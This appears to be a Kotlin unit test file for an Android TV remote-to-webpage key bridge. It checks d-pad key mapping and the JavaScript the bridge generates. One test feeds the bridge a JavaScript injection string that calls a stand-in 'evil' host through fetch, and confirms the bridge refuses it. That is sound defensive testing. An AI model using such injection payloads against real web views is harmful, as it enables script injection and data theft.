package com.amazon.mercury.wallboard

import android.view.KeyEvent
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * JVM unit tests for the remote-to-page key bridge. `KeyEvent` key codes are
 * plain integer constants, so these need no device.
 */
class DpadBridgeTest {

    @Test
    fun `every d-pad direction maps to the name the cockpit page expects`() {
        assertEquals("UP", DpadBridge.directionFor(KeyEvent.KEYCODE_DPAD_UP))
        assertEquals("DOWN", DpadBridge.directionFor(KeyEvent.KEYCODE_DPAD_DOWN))
        assertEquals("LEFT", DpadBridge.directionFor(KeyEvent.KEYCODE_DPAD_LEFT))
        assertEquals("RIGHT", DpadBridge.directionFor(KeyEvent.KEYCODE_DPAD_RIGHT))
    }

    @Test
    fun `centre and both enter keys all mean select`() {
        assertEquals("SELECT", DpadBridge.directionFor(KeyEvent.KEYCODE_DPAD_CENTER))
        assertEquals("SELECT", DpadBridge.directionFor(KeyEvent.KEYCODE_ENTER))
        assertEquals("SELECT", DpadBridge.directionFor(KeyEvent.KEYCODE_NUMPAD_ENTER))
    }

    @Test
    fun `back is routed to the page rather than swallowed`() {
        assertEquals("BACK", DpadBridge.directionFor(KeyEvent.KEYCODE_BACK))
    }

    @Test
    fun `keys the cockpit does not handle are left to the platform`() {
        assertNull(DpadBridge.directionFor(KeyEvent.KEYCODE_VOLUME_UP))
        assertNull(DpadBridge.directionFor(KeyEvent.KEYCODE_HOME))
        assertNull(DpadBridge.directionFor(KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE))
        assertNull(DpadBridge.directionFor(KeyEvent.KEYCODE_A))
    }

    @Test
    fun `the generated script guards against a page that is not the cockpit`() {
        val script = DpadBridge.scriptFor(DpadBridge.DOWN)
        assertTrue(script.contains("typeof window.navigateDpad!=='function'"))
        assertTrue(script.contains("window.navigateDpad('DOWN')"))
        assertTrue(script.contains("===true"))
    }

    @Test(expected = IllegalArgumentException::class)
    fun `an unsupported direction is refused instead of being injected`() {
        DpadBridge.scriptFor("'); fetch('http://evil'); ('")
    }

    @Test
    fun `only the literal true counts as the page consuming a key`() {
        assertTrue(DpadBridge.pageConsumedKey("true"))
        assertTrue(DpadBridge.pageConsumedKey(" true "))
        assertFalse(DpadBridge.pageConsumedKey("false"))
        assertFalse(DpadBridge.pageConsumedKey("null"))
        assertFalse(DpadBridge.pageConsumedKey(null))
        assertFalse(DpadBridge.pageConsumedKey(""))
        assertFalse(DpadBridge.pageConsumedKey("\"true\""))
    }
}
